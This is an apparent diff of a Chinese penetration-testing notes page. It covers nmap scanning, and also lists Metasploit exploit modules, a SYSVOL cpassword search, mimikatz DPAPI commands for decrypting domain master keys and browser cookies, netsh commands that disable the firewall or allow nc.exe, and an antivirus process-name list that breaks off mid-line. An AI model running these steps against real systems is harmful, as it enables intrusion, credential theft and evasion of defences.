@@ -86,6 +86,226 @@
 <p>无凭证常用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP ip   #ping扫描</span><br><span class="line">nmap -Pn -sV --top-ports 50 --open ip  #快速扫描 禁用ping，扫描端口服务程序版本，扫描top50端口</span><br><span class="line">nmap -Pn -sC smb-vuln* -p 139，445 ip  #检测smb服务 禁用ping 使用脚本检测smb服务 139和445端口</span><br><span class="line">nmap -Pn -sC -sV ip #经典扫描</span><br><span class="line">nmap -Pn -sC -sV -p- ip #全扫描</span><br><span class="line">nmap -sU -sC -sV ip # UDP扫描</span><br></pre></td></tr></table></figure>
 
+<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>当我们需要对公司的整个网络进行内部渗透测试时，首先我们应该大致了解哪些系统在线可以使用。 要主动发现网络上的此类系统，我们可以使用各种主机发现选项。提供了许多选项来确定我们的目标是否还活着。最有效的主机发现方法是使用 <strong>ICMP 回显请求</strong>，我们将对此进行研究。<code>Nmap``Nmap</code></p>
+<p>始终建议存储每个扫描。这以后可用于比较、记录和报告。毕竟，不同的工具可能会产生不同的结果。因此，区分哪个工具产生哪些结果是有益的。</p>
+<h4 id="扫描网络范围"><a href="#扫描网络范围" class="headerlink" title="扫描网络范围"></a>扫描网络范围</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.129.2.0/24 -sn -oA tnet | grep <span class="keyword">for</span> | <span class="built_in">cut</span> -d<span class="string">&quot; &quot;</span> -f5</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><code>10.129.2.0/24</code></th>
+<th>目标网络范围。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-sn</code></td>
+<td>禁用端口扫描。</td>
+</tr>
+<tr>
+<td><code>-oA tnet</code></td>
+<td>以名称“tnet”开头的所有格式存储结果。</td>
+</tr>
+</tbody></table>
+<p>仅当主机的防火墙允许时，此扫描方法才有效。否则，我们可以使用其他扫描技术来确定主机是否处于活动状态。</p>
+<h4 id="扫描-IP-列表"><a href="#扫描-IP-列表" class="headerlink" title="扫描 IP 列表"></a>扫描 IP 列表</h4><p>在内部渗透测试期间，向我们提供包含我们需要测试的主机的 IP 列表的情况并不少见。 还为我们提供了使用列表并从此列表中读取主机的选项，而不是手动定义或键入它们。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn -oA tnet -iL hosts.lst | grep <span class="keyword">for</span> | <span class="built_in">cut</span> -d<span class="string">&quot; &quot;</span> -f5</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><code>-sn</code></th>
+<th>禁用端口扫描。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-oA tnet</code></td>
+<td>以名称“tnet”开头的所有格式存储结果。</td>
+</tr>
+<tr>
+<td><code>-iL</code></td>
+<td>对提供的“hosts.lst”列表中的目标执行定义的扫描。</td>
+</tr>
+</tbody></table>
+<p>nmap确定是否方法 </p>
+<p>显示发送数据包的过程 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace </span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><code>-PE</code></th>
+<th>使用针对目标的“ICMP 回显请求”执行 ping 扫描。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--packet-trace</code></td>
+<td>显示发送和接收的所有数据包</td>
+</tr>
+</tbody></table>
+<p>确定为什么Nmap将我们的目标标记为“活动”的另一种方法是使用“”选项。<code>--reason</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.129.2.18 -sn -oA host -PE --reason </span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><code>-PE</code></th>
+<th>使用针对目标的“ICMP 回显请求”执行 ping 扫描。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--reason</code></td>
+<td>显示特定结果的原因</td>
+</tr>
+</tbody></table>
+<p>1、WINDOWS NT&#x2F;2000 TTL: 128<br>2、WINDOWS 95&#x2F;98      TTL: 32<br>3、UNIX                          TTL: 255<br>4、LINUX                        TTL: 64<br>5、WIN7                          TTL: 64</p>
+<h3 id="主机和端口扫描"><a href="#主机和端口扫描" class="headerlink" title="主机和端口扫描"></a>主机和端口扫描</h3><p>我们需要的信息包括：</p>
+<ul>
+<li><p>开放端口及其服务</p>
+</li>
+<li><p>服务版本</p>
+</li>
+<li><p>服务提供的信息</p>
+</li>
+<li><p>操作系统</p>
+<p>扫描端口总共有 6 种不同的状态，我们可以获得：</p>
+<table>
+<thead>
+<tr>
+<th><code>open</code></th>
+<th>这表示已建立与扫描端口的连接。这些连接可以是 <strong>TCP 连接</strong>、<strong>UDP 数据报</strong>以及 <strong>SCTP 关联</strong>。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>closed</code></td>
+<td>当端口显示为关闭时，TCP 协议指示我们收到的数据包包含一个标志。这种扫描方法也可用于确定我们的目标是否还活着。<code>RST</code></td>
+</tr>
+<tr>
+<td><code>filtered</code></td>
+<td>Nmap 无法正确识别扫描的端口是打开还是关闭，因为没有从端口的目标返回响应，或者我们从目标收到错误代码。</td>
+</tr>
+<tr>
+<td><code>unfiltered</code></td>
+<td>端口的这种状态仅在 <strong>TCP-ACK</strong> 扫描期间发生，意味着该端口是可访问的，但无法确定它是打开还是关闭。</td>
+</tr>
+<tr>
+<td>&#96;open</td>
+<td>filtered&#96;</td>
+</tr>
+<tr>
+<td>&#96;closed</td>
+<td>filtered&#96;</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<p>默认情况下，使用 SYN 扫描 （） 扫描前 1000 个 TCP 端口。此 SYN 扫描仅在我们以 root 身份运行时设置为默认值，因为创建原始 TCP 数据包所需的套接字权限。否则，默认情况下执行 TCP 扫描 （）。这意味着如果我们不定义端口和扫描方法，这些参数将自动设置。 我们可以通过扫描所有端口 （） 以及定义包含前 100 个端口的快速端口扫描来定义数据库中签名最频繁的端口 （）、按范围 （）、按顶部端口 （） 定义端口。<code>Nmap``-sS``-sT``-p 22,25,80,139,445``-p 22-445``--top-ports=10``Nmap``-p-``-F</code></p>
+<h4 id="扫描前-10-个-TCP-端口"><a href="#扫描前-10-个-TCP-端口" class="headerlink" title="扫描前 10 个 TCP 端口"></a>扫描前 10 个 TCP 端口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.129.2.28 --top-ports=10 </span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><code>10.129.2.28</code></th>
+<th>扫描指定的目标。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--top-ports=10</code></td>
+<td>扫描已定义为最频繁的指定顶部端口。</td>
+</tr>
+</tbody></table>
+<p>如果我们跟踪发送的数据包，我们将看到目标发回给我们的标志。为了清楚地了解 SYN 扫描，我们禁用了 ICMP 回显请求 （）、DNS 解析 （） 和 ARP ping 扫描 （）。<code>Nmap``Nmap``RST``TCP port 21``-Pn``-n``--disable-arp-ping</code></p>
+<h4 id="Nmap-跟踪数据包"><a href="#Nmap-跟踪数据包" class="headerlink" title="Nmap - 跟踪数据包"></a>Nmap - 跟踪数据包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><code>-p 21</code></th>
+<th>仅扫描指定的端口。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--packet-trace</code></td>
+<td>显示发送和接收的所有数据包。</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>禁用 DNS 解析。</td>
+</tr>
+<tr>
+<td><code>--disable-arp-ping</code></td>
+<td>禁用 ARP 平。</td>
+</tr>
+</tbody></table>
+<h4 id="连接扫描"><a href="#连接扫描" class="headerlink" title="连接扫描"></a>连接扫描</h4><p>Nmap TCP <a target="_blank" rel="noopener" href="https://nmap.org/book/scan-methods-connect-scan.html">连接扫描</a> （） 使用 TCP 三次握手来确定目标主机上的特定端口是打开还是关闭。扫描将数据包发送到目标端口并等待响应。如果目标端口以数据包响应，则视为打开，如果目标端口以数据包响应，则视为关闭。<code>-sT``SYN``SYN-ACK``RST</code></p>
+<p>扫描非常有用，因为它是确定端口状态的最准确方法，也是最隐蔽的方法。与其他类型的扫描（如 SYN 扫描）不同，Connect 扫描不会在目标主机上留下任何未完成的连接或未发送的数据包，这使得入侵检测系统 （IDS） 或入侵防御系统 （IPS） 不太可能检测到它。当我们想要映射网络并且不想干扰其后面运行的服务时，它很有用，因此造成的影响最小，有时被认为是一种更礼貌的扫描方法。<code>Connect</code></p>
+<p>当目标主机具有丢弃传入数据包但允许传出数据包的个人防火墙时，它也很有用。在这种情况下，连接扫描可以绕过防火墙并准确确定目标端口的状态。但是，请务必注意，Connect 扫描比其他类型的扫描慢，因为它要求扫描程序在发送每个数据包后等待目标的响应，如果目标繁忙或无响应，这可能需要一些时间。</p>
+<h4 id="在-TCP-端口-443-上连接扫描"><a href="#在-TCP-端口-443-上连接扫描" class="headerlink" title="在 TCP 端口 443 上连接扫描"></a>在 TCP 端口 443 上连接扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT </span><br></pre></td></tr></table></figure>
+
+<h4 id="UDP-端口扫描"><a href="#UDP-端口扫描" class="headerlink" title="UDP 端口扫描"></a>UDP 端口扫描</h4><p>让我们看一个UDP扫描（）的外观以及它给我们的结果的示例。<code>-sU</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.129.2.28 -F -sU</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><code>10.129.2.28</code></th>
+<th>扫描指定的目标。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-F</code></td>
+<td>扫描前 100 个端口。</td>
+</tr>
+<tr>
+<td><code>-sU</code></td>
+<td>执行 UDP 扫描</td>
+</tr>
+</tbody></table>
+<h4 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h4><p>扫描端口的另一种方便方法是用于从打开的端口获取其他可用信息的选项。此方法可以识别有关目标的版本、服务名称和详细信息。<code>-sV</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason  -sV</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><code>10.129.2.28</code></th>
+<th>扫描指定的目标。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-Pn</code></td>
+<td>禁用 ICMP 回显请求。</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>禁用 DNS 解析。</td>
+</tr>
+<tr>
+<td><code>--disable-arp-ping</code></td>
+<td>禁用 ARP 平。</td>
+</tr>
+<tr>
+<td><code>--packet-trace</code></td>
+<td>显示发送和接收的所有数据包。</td>
+</tr>
+<tr>
+<td><code>-p 445</code></td>
+<td>仅扫描指定的端口。</td>
+</tr>
+<tr>
+<td><code>--reason</code></td>
+<td>显示端口处于特定状态的原因。</td>
+</tr>
+<tr>
+<td><code>-sV</code></td>
+<td>执行服务扫描。</td>
+</tr>
+</tbody></table>
+<h2 id="保存结果"><a href="#保存结果" class="headerlink" title="保存结果"></a>保存结果</h2><h3 id="不同的格式"><a href="#不同的格式" class="headerlink" title="不同的格式"></a>不同的格式</h3><h2 id="不同的格式-1"><a href="#不同的格式-1" class="headerlink" title="不同的格式"></a>不同的格式</h2><p>当我们运行各种扫描时，我们应该始终保存结果。我们稍后可以使用这些来检查我们使用的不同扫描方法之间的差异。 可以将结果保存为3种不同的格式。<code>Nmap</code></p>
+<ul>
+<li>带有文件扩展名的正常输出 （）<code>-oN``.nmap</code></li>
+<li>文件扩展名的可复制输出 （）<code>-oG``.gnmap</code></li>
+<li>带有文件扩展名的 XML 输出 （）<code>-oX``.xml</code></li>
+</ul>
+<p>我们还可以指定选项 （） 以保存所有格式的结果。该命令可能如下所示：<code>-oA</code></p>
 <h2 id="漏洞快速探测"><a href="#漏洞快速探测" class="headerlink" title="漏洞快速探测"></a>漏洞快速探测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java rmi： exploit/multi/misc/java_rmi_server</span><br><span class="line">ms17-010：exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary/scanner/http/tomcat_enum</span><br><span class="line">jboss manager：exploit/multi/http/tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin/mssql/mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure>
 
 
@@ -266,6 +486,139 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">而如果是域用户的话，是由域用户的master key就是由域的DPAPI key来保护的，`lsadump::backupkeys /system:DC CONTROLLER /export`会得到一个PVK文件，可以用来解密所有域用户的Master Key，而且这个key是不会改变的。</span><br><span class="line">`dpapi::masterkey /in:&quot;C:UsersxxxxxAppDataRoamingMicrosoftProtectsid值ca748af3–8b95–40ae-8134-cb9534762688&quot; /pvk</span><br><span class="line">:导出的PVK文件`这里就可以解密得到域用户的Master Key值。然后跟上面一样</span><br><span class="line">`dpapi::chrome /in:Cookies /masterkey:a3fv34aedd7...`，这样就能解密Cookies的内容了。</span><br></pre></td></tr></table></figure>
 
+<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.用户列表 net user /domain</span><br><span class="line">windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户</span><br><span class="line">2.进程列表 tasklist /svc</span><br><span class="line">分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等</span><br><span class="line">3.服务列表 tasklist /svc</span><br><span class="line">与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限/漏洞]</span><br><span class="line">4.端口列表 netstat -ano</span><br><span class="line">开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集</span><br><span class="line">5.补丁列表 systeminfo</span><br><span class="line">分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞</span><br><span class="line">6.本机共享 smbclient -L ip</span><br><span class="line">net user \\ip\c$</span><br><span class="line">本机共享列表/访问权限 本机访问的域共享/访问权限</span><br><span class="line">7.本用户习惯分析</span><br><span class="line">历史记录 收藏夹 文档等</span><br></pre></td></tr></table></figure>
+
+<h3 id="查询系统体系结构"><a href="#查询系统体系结构" class="headerlink" title="查询系统体系结构"></a>查询系统体系结构</h3><p><code>echo %PROCESSOR_ARCHITECTURE%</code></p>
+<h3 id="查看安装的软件及版本、路径等"><a href="#查看安装的软件及版本、路径等" class="headerlink" title="查看安装的软件及版本、路径等"></a>查看安装的软件及版本、路径等</h3><p><code>wmic product get name,version</code></p>
+<h3 id="利用PowerShell命令，收集软件的版本信息"><a href="#利用PowerShell命令，收集软件的版本信息" class="headerlink" title="利用PowerShell命令，收集软件的版本信息"></a>利用PowerShell命令，收集软件的版本信息</h3><p><code>powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</code></p>
+<h3 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a>查询本机服务信息</h3><p><code>wmic service list brief</code></p>
+<h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><p><code>tasklist</code><br><code>wmic process list brief</code></p>
+<h3 id="查看启动程序信息"><a href="#查看启动程序信息" class="headerlink" title="查看启动程序信息"></a>查看启动程序信息</h3><p><code>wmic startup get command,caption</code></p>
+<h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><p><code>schtasks /query /fo LIST /v</code></p>
+<h3 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h3><p><code>net statistics workstation</code></p>
+<h3 id="查看补丁列表"><a href="#查看补丁列表" class="headerlink" title="查看补丁列表"></a>查看补丁列表</h3><p><code>systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p>
+<h3 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h3><p><code>net share wmic share get name,path,status</code></p>
+<h3 id="查询路由表及所有可用接口的ARP缓存表"><a href="#查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="查询路由表及所有可用接口的ARP缓存表"></a>查询路由表及所有可用接口的ARP缓存表</h3><p><code>route print arp -a</code></p>
+<h3 id="防火墙配置命令"><a href="#防火墙配置命令" class="headerlink" title="防火墙配置命令"></a>防火墙配置命令</h3><p>查询防火墙相关配置</p>
+<p><code>关闭防火墙： win2003以前的版本：netsh firewall set opmode disable win2003以后的版本：netsh advfirewall set allprofiles state off 查看防火墙配置： netsh firewall show config 修改防火墙配置： win2003以前的版本：netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable win2003以后的版本：netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c:\nc.exe&quot; 允许指定程序退出：netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;c:\nc.exe&quot; 允许3389端口放行：netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow 自定义防火墙日志的储存位置： netsh advfirewall set currentprofile logging filename &quot;C:\window\temp\fw.log&quot;</code></p>
+<h3 id="查看代理配置情况"><a href="#查看代理配置情况" class="headerlink" title="查看代理配置情况"></a>查看代理配置情况</h3><p><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></p>
+<h3 id="查看远程连接端口："><a href="#查看远程连接端口：" class="headerlink" title="查看远程连接端口："></a>查看远程连接端口：</h3><p><code>Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumber</code></p>
+<h2 id="常见杀软"><a href="#常见杀软" class="headerlink" title="常见杀软"></a>常见杀软</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">常见杀毒软件进程</span><br><span class="line"></span><br><span class="line">&#123;&quot;360tray.exe&quot;,   &quot;360安全卫士&quot;&#125;,</span><br><span class="line">&#123;&quot;360sd.exe&quot;,    &quot;360杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;a2guard.exe&quot;,   &quot;a-squared杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;ad-watch.exe&quot;,   &quot;Lavasoft杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;cleaner8.exe&quot;,   &quot;The Cleaner杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;vba32lder.exe&quot;,   &quot;vb32杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;MongoosaGUI.exe&quot;,   &quot;Mongoosa杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;CorantiControlCenter3-2.exe&quot;,   &quot;Coranti2012杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;F-PROT.EXE&quot;,   &quot;F-PROT杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;CMCTrayIcon.exe&quot;,   &quot;CMC杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;K7TSecurity.exe&quot;,   &quot;K7杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;UnThreat.exe&quot;,   &quot;UnThreat杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;CKSoftShiedAntivirus4.exe&quot;,   &quot;Shield Antivirus杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;AVWatchService.exe&quot;,   &quot;VIRUSfighter杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;ArcaTasksService.exe&quot;,   &quot;ArcaVir杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;iptray.exe&quot;,   &quot;Immunet杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;PSafeSysTray.exe&quot;,   &quot;PSafe杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;nspupsvc.exe&quot;,   &quot;nProtect杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;SpywareTerminatorShield.exe&quot;,   &quot;SpywareTerminator杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;BKavService.exe&quot;,   &quot;Bkav杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;MsMpEng.exe&quot;,   &quot;Microsoft Security Essentials&quot;&#125;,</span><br><span class="line">&#123;&quot;SBAMSvc.exe&quot;,   &quot;VIPRE&quot;&#125;,</span><br><span class="line">&#123;&quot;ccSvcHst.exe&quot;,   &quot;Norton杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;QQ.exe&quot;,   &quot;QQ&quot;&#125;,</span><br><span class="line">&#123;&quot;f-secure.exe&quot;,   &quot;冰岛&quot;&#125;,</span><br><span class="line">&#123;&quot;avp.exe&quot;,     &quot;卡巴斯基&quot;&#125;,</span><br><span class="line">&#123;&quot;KvMonXP.exe&quot;,   &quot;江民杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;RavMonD.exe&quot;,   &quot;瑞星杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;Mcshield.exe&quot;,  &quot;麦咖啡&quot;&#125;,</span><br><span class="line">&#123;&quot;egui.exe&quot;,    &quot;NOD32&quot;&#125;,</span><br><span class="line">&#123;&quot;kxetray.exe&quot;,   &quot;金山毒霸&quot;&#125;,</span><br><span class="line">&#123;&quot;knsdtray.exe&quot;,  &quot;可牛杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;avcenter.exe&quot;,  &quot;Avira(小红伞)&quot;&#125;,</span><br><span class="line">&#123;&quot;ashDisp.exe&quot;,   &quot;Avast网络安全&quot;&#125;,</span><br><span class="line">&#123;&quot;rtvscan.exe&quot;,   &quot;诺顿杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;ksafe.exe&quot;,    &quot;金山卫士&quot;&#125;,</span><br><span class="line">&#123;&quot;QQPCRTP.exe&quot;,   &quot;QQ电脑管家&quot;&#125;,</span><br><span class="line">&#123;&quot;Miner.exe&quot;,   &quot;流量矿石&quot;&#125;,</span><br><span class="line">&#123;&quot;AYAgent.aye&quot;,   &quot;韩国胶囊&quot;&#125;,</span><br><span class="line">&#123;&quot;patray.exe&quot;,   &quot;安博士&quot;&#125;,</span><br><span class="line">&#123;&quot;V3Svc.exe&quot;,   &quot;安博士V3&quot;&#125;,</span><br><span class="line">&#123;&quot;avgwdsvc.exe&quot;,   &quot;AVG杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;ccSetMgr.exe&quot;,   &quot;赛门铁克&quot;&#125;,</span><br><span class="line">&#123;&quot;QUHLPSVC.EXE&quot;,   &quot;QUICK HEAL杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;mssecess.exe&quot;,   &quot;微软杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;SavProgress.exe&quot;,   &quot;Sophos杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;fsavgui.exe&quot;,   &quot;F-Secure杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;vsserv.exe&quot;,   &quot;比特梵德&quot;&#125;,</span><br><span class="line">&#123;&quot;remupd.exe&quot;,   &quot;熊猫卫士&quot;&#125;,</span><br><span class="line">&#123;&quot;FortiTray.exe&quot;,   &quot;飞塔&quot;&#125;,</span><br><span class="line">&#123;&quot;safedog.exe&quot;,   &quot;安全狗&quot;&#125;,</span><br><span class="line">&#123;&quot;parmor.exe&quot;,   &quot;木马克星&quot;&#125;,</span><br><span class="line">&#123;&quot;beikesan.exe&quot;,   &quot;贝壳云安全&quot;&#125;,</span><br><span class="line">&#123;&quot;KSWebShield.exe&quot;,   &quot;金山网盾&quot;&#125;,</span><br><span class="line">&#123;&quot;TrojanHunter.exe&quot;,   &quot;木马猎手&quot;&#125;,</span><br><span class="line">&#123;&quot;GG.exe&quot;,   &quot;巨盾网游安全盾&quot;&#125;,</span><br><span class="line">&#123;&quot;adam.exe&quot;,   &quot;绿鹰安全精灵&quot;&#125;,</span><br><span class="line">&#123;&quot;AST.exe&quot;,   &quot;超级巡警&quot;&#125;,</span><br><span class="line">&#123;&quot;ananwidget.exe&quot;,   &quot;墨者安全专家&quot;&#125;,</span><br><span class="line">&#123;&quot;AVK.exe&quot;,   &quot;GData&quot;&#125;,</span><br><span class="line">&#123;&quot;ccapp.exe&quot;,   &quot;Symantec Norton&quot;&#125;,</span><br><span class="line">&#123;&quot;avg.exe&quot;,   &quot;AVG Anti-Virus&quot;&#125;,</span><br><span class="line">&#123;&quot;spidernt.exe&quot;,   &quot;Dr.web&quot;&#125;,</span><br><span class="line">&#123;&quot;Mcshield.exe&quot;,   &quot;Mcafee&quot;&#125;,</span><br><span class="line">&#123;&quot;avgaurd.exe&quot;,   &quot;Avira Antivir&quot;&#125;,</span><br><span class="line">&#123;&quot;F-PROT.exe&quot;,   &quot;F-Prot AntiVirus&quot;&#125;,</span><br><span 